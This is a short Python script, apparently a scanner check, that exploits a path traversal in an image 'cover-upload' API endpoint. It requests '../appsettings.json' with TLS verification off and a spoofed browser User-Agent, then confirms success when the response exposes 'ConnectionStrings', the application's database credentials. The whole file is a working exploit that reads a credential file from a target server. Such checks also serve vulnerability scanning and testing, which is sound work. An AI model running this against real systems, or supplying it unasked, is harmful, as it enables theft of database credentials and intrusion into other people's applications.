import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def doCheck(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/image/cover-upload?filename=../appsettings.json"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=requests.get(url,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "Microsoft.AspNetCore.Hosting.Internal.WebHost" in response.text and "ConnectionStrings" in response.text and "image/json" in response.headers["Content-Type"]:
		r1=True
	else:
		r1=False
	if r1:
		return True
	else:
		return False
